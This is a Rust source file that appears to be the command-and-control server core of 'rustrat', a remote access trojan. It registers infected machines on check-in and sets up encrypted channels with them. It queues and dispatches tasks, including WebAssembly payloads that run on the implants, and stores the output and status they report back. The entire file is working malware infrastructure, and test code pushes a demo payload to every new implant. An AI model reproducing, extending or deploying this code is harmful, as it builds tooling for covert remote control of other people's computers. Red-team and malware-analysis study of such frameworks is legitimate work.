pub mod messages;

use std::collections::HashMap;
use std::convert::{TryFrom, TryInto};
use tokio::sync::mpsc::{channel, Receiver, Sender};
use tokio::task::spawn_blocking;

use rustrat_common::encryption;
use rustrat_common::messages::*;

use crate::core::messages::*;
use crate::error::*;
use crate::persistence::tables;

// TODO: Remove all unwraps and other things that may cause panics

// TODO utilize more concurrency friendly data structures?
// TODO remove pub and create constructor function?
pub struct CoreTask {
    shared_keys: HashMap<encryption::PublicKey, encryption::SharedKey>,
    private_key: encryption::PrivateKey,
    pub db_pool: crate::persistence::Pool,
    rx: Receiver<Job>,
    pub tx: Sender<Job>,
}

impl CoreTask {
    pub async fn new(
        private_key: encryption::PrivateKey,
        db_pool: crate::persistence::Pool,
    ) -> Self {
        let public_keys = sqlx::query!("SELECT public_key FROM rats WHERE alive = true")
            .fetch_all(&db_pool.reader)
            .await
            .unwrap();

        let shared_keys = spawn_blocking(move || {
            let mut shared_keys: HashMap<encryption::PublicKey, encryption::SharedKey> =
                HashMap::new();

            for public_key_vec in public_keys {
                match public_key_vec.public_key.try_into() {
                    Ok(public_key) => {
                        let shared_key = encryption::get_shared_key(private_key, public_key);
                        shared_keys.insert(public_key, shared_key);
                    }

                    Err(err) => {
                        log::error!("Unable to read public key: {:?}", err);
                    }
                }
            }

            shared_keys
        })
        .await
        .unwrap();

        // TODO sane default for buffer size?
        let (tx, rx) = channel::<Job>(32);

        CoreTask {
            shared_keys,
            private_key,
            db_pool,
            rx,
            tx,
        }
    }

    pub async fn run(&mut self) {
        while let Some(job) = self.rx.recv().await {
            self.process_job(job).await;
        }
    }

    pub async fn process_job(&mut self, job: Job) {
        match *job.message {
            // TODO spawn a new task here instead?
            Task::RatToServer(msg) => self.process_rat_task(&msg, job.tx).await,
        }
    }

    async fn process_rat_task(
        &mut self,
        task: &rat_to_server::Message,
        reply_channel: ReplyChannel,
    ) {
        let db_pool = self.db_pool.clone();

        // TODO rewrite this, divide into smaller sections. Log error if no response is sent?
        match task {
            rat_to_server::Message::CheckIn(encrypted_message) => {
                let public_key = &encrypted_message.public_key;

                if self.shared_keys.contains_key(public_key) {
                    let _ = reply_channel.send(Err(Error::PublicKeyAlreadyExistsOnCheckin));
                    return;
                }

                let shared_key = encryption::get_shared_key(self.private_key, *public_key);

                // TODO avoid cloning?
                let encrypted_message = encrypted_message.clone();
                let request = spawn_blocking(move || encrypted_message.to_request(shared_key))
                    .await
                    .unwrap();
                if request.is_err() {
                    let _ = reply_channel.send(Err(Error::DecryptionError));
                    return;
                }
                // TODO parse checkin message?

                self.shared_keys.insert(*public_key, shared_key);

                // TODO is it possible to do this without creating a new vec?
                let pk_vec = Vec::from(*public_key);
                sqlx::query!("INSERT INTO rats (public_key, first_seen, last_callback, alive) VALUES (?, datetime('now'), datetime('now'), true)", pk_vec).execute(&db_pool.writer).await.unwrap();

                log::info!("New rat checked in with public key {:?}", public_key);

                // TODO remove test code
                let rat_id = sqlx::query!("SELECT rat_id FROM rats WHERE public_key = ?", pk_vec)
                    .fetch_one(&db_pool.reader)
                    .await
                    .unwrap();
                let payload = serialize(&server_to_rat::Task::WebAssemblyTask{ wasm: include_bytes!("../../../payloads/target/wasm32-unknown-unknown/debug/demo_messagebox.wasm").to_vec(), fn_name: "go".to_string()}).unwrap();
                sqlx::query!("INSERT INTO jobs (rat_id, created, last_update, started, done, job_type, payload) VALUES (?, datetime('now'), datetime('now'), false, false, 'task', ?)", rat_id.rat_id, payload).execute(&db_pool.writer).await.unwrap();

                self.send_encrypted_response(
                    server_to_rat::Response::CheckinSuccessful,
                    reply_channel,
                    shared_key,
                )
                .await
            }

            rat_to_server::Message::EncryptedMessage(encrypted_message) => {
                let shared_key = match self.shared_keys.get(&encrypted_message.public_key) {
                    Some(key) => *key,
                    None => {
                        let _ = reply_channel.send(Err(Error::PublicKeyDoesNotExist));
                        return;
                    }
                };

                // TODO avoid cloning here? Wrap encrypted messages in Arc possibly?
                let msg = encrypted_message.clone();
                let decrypted_message = spawn_blocking(move || msg.to_request(shared_key))
                    .await
                    .unwrap();

                let message = match decrypted_message {
                    Ok(msg) => msg,
                    Err(_) => {
                        let _ = reply_channel.send(Err(Error::DecryptionError));
                        return;
                    }
                };

                // TODO is it possible to do this without creating a new vec?
                let pk_vec = Vec::from(encrypted_message.public_key);
                match message {
                    rat_to_server::Request::NumberOfPendingTasks => {
                        let tasks_count = sqlx::query!(
                            "SELECT COUNT(jobs.job_id) as tasks FROM jobs, rats WHERE rats.public_key = ? AND rats.rat_id = jobs.rat_id AND started = false", 
                            pk_vec
                        ).fetch_one(&db_pool.reader).await.unwrap();

                        sqlx::query!(
                            "UPDATE rats SET last_callback = datetime('now') WHERE public_key = ?",
                            pk_vec
                        )
                        .execute(&db_pool.writer)
                        .await
                        .unwrap();
                        self.send_encrypted_response(
                            server_to_rat::Response::NumberOfPendingTasks(tasks_count.tasks as u32),
                            reply_channel,
                            shared_key,
                        )
                        .await
                    }

                    rat_to_server::Request::GetPendingTask => {
                        struct PendingTask {
                            job_id: i64,
                            job_type: String,
                            payload: Vec<u8>,
                        }

                        // We want to fetch a new task and set started to true if there is a task, so we use a transaction to avoid sending the same task twice.
                        // TODO Replace with RETURNING when sqlx has support for it (https://github.com/launchbadge/sqlx/issues/1115)
                        let mut transaction = db_pool.writer.begin().await.unwrap();

                        sqlx::query!(
                            "UPDATE rats SET last_callback = datetime('now') WHERE public_key = ?",
                            pk_vec
                        )
                        .execute(&mut transaction)
                        .await
                        .unwrap();

                        let query_result = sqlx::query_as!(
                            PendingTask,
                            "SELECT jobs.job_id, jobs.job_type, jobs.payload
                            FROM jobs, rats
                            WHERE rats.public_key = ?
                                AND rats.rat_id = jobs.rat_id
                                AND jobs.started = false
                            ORDER BY job_id ASC
                            LIMIT 1",
                            pk_vec
                        )
                        .fetch_all(&mut transaction)
                        .await
                        .unwrap();

                        let job = match query_result.first() {
                            Some(t) => t,
                            None => {
                                transaction.commit().await.unwrap();
                                return self
                                    .send_encrypted_response(
                                        server_to_rat::Response::NoTasks,
                                        reply_channel,
                                        shared_key,
                                    )
                                    .await;
                            }
                        };

                        // TODO remove payload after job has been fetched?
                        sqlx::query!("UPDATE jobs SET started = true, last_update = datetime('now') WHERE job_id = ?", job.job_id).execute(&mut transaction).await.unwrap();
                        transaction.commit().await.unwrap();

                        let job_type = tables::JobType::try_from(job.job_type.as_str()).unwrap();

                        match job_type {
                            tables::JobType::Task => {
                                let task: server_to_rat::Task = deserialize(&job.payload).unwrap();
                                self.send_encrypted_response(
                                    server_to_rat::Response::Task {
                                        id: job.job_id,
                                        task,
                                    },
                                    reply_channel,
                                    shared_key,
                                )
                                .await
                            }

                            tables::JobType::Exit => {
                                self.send_encrypted_response(
                                    server_to_rat::Response::Exit,
                                    reply_channel,
                                    shared_key,
                                )
                                .await
                            }
                        }
                    }

                    rat_to_server::Request::Exit => {
                        sqlx::query!("UPDATE rats SET last_callback = datetime('now'), alive = false WHERE public_key = ?", pk_vec).execute(&db_pool.writer).await.unwrap();

                        self.shared_keys.remove(&encrypted_message.public_key);

                        self.send_encrypted_response(
                            server_to_rat::Response::Exit,
                            reply_channel,
                            shared_key,
                        )
                        .await
                    }

                    rat_to_server::Request::Nop => {
                        let mut transaction = db_pool.writer.begin().await.unwrap();

                        sqlx::query!(
                            "UPDATE rats SET last_callback = datetime('now') WHERE public_key = ?",
                            pk_vec
                        )
                        .execute(&mut transaction)
                        .await
                        .unwrap();

                        self.send_encrypted_response(
                            server_to_rat::Response::Nop,
                            reply_channel,
                            shared_key,
                        )
                        .await
                    }

                    rat_to_server::Request::Output { task_id, output } => {
                        let mut transaction = db_pool.writer.begin().await.unwrap();

                        sqlx::query!(
                            "UPDATE rats SET last_callback = datetime('now') WHERE public_key = ?",
                            pk_vec
                        )
                        .execute(&mut transaction)
                        .await
                        .unwrap();

                        log::info!("Output from task {}: {}", task_id, output);

                        sqlx::query!(
                            "INSERT INTO jobs_output (job_id, output, created) VALUES (?, ?, datetime('now'));",
                            task_id,
                            output
                        )
                        .execute(&mut transaction)
                        .await
                        .unwrap();

                        self.send_encrypted_response(
                            server_to_rat::Response::Nop,
                            reply_channel,
                            shared_key,
                        )
                        .await
                    }

                    rat_to_server::Request::TaskDone { task_id, result: _ } => {
                        let mut transaction = db_pool.writer.begin().await.unwrap();

                        sqlx::query!(
                            "UPDATE rats SET last_callback = datetime('now') WHERE public_key = ?",
                            pk_vec
                        )
                        .execute(&mut transaction)
                        .await
                        .unwrap();

                        log::info!("Job {} done", task_id);

                        sqlx::query!("UPDATE jobs SET done = true WHERE job_id = ?", task_id)
                            .execute(&mut transaction)
                            .await
                            .unwrap();

                        self.send_encrypted_response(
                            server_to_rat::Response::Nop,
                            reply_channel,
                            shared_key,
                        )
                        .await
                    }

                    rat_to_server::Request::TaskFailed { task_id } => {
                        let mut transaction = db_pool.writer.begin().await.unwrap();

                        sqlx::query!(
                            "UPDATE rats SET last_callback = datetime('now') WHERE public_key = ?",
                            pk_vec
                        )
                        .execute(&mut transaction)
                        .await
                        .unwrap();

                        log::error!("Job {} failed", task_id);

                        sqlx::query!("UPDATE jobs SET done = true WHERE job_id = ?", task_id)
                            .execute(&mut transaction)
                            .await
                            .unwrap();

                        self.send_encrypted_response(
                            server_to_rat::Response::Nop,
                            reply_channel,
                            shared_key,
                        )
                        .await
                    }
                }
            }
        }
    }

    async fn send_encrypted_response(
        &self,
        response: server_to_rat::Response,
        reply_channel: ReplyChannel,
        shared_key: encryption::SharedKey,
    ) {
        let encrypted_message = spawn_blocking(move || {
            response.to_encrypted_message(shared_key, &mut rand::thread_rng())
        })
        .await
        .unwrap();

        let reply_message = server_to_rat::Message::EncryptedMessage(match encrypted_message {
            Ok(encrypted_message) => encrypted_message,
            Err(_) => panic!("Encryption failed!?"),
        });

        let _ = reply_channel.send(Ok(Box::new(Reply::ServerToRat(reply_message))));
    }
}
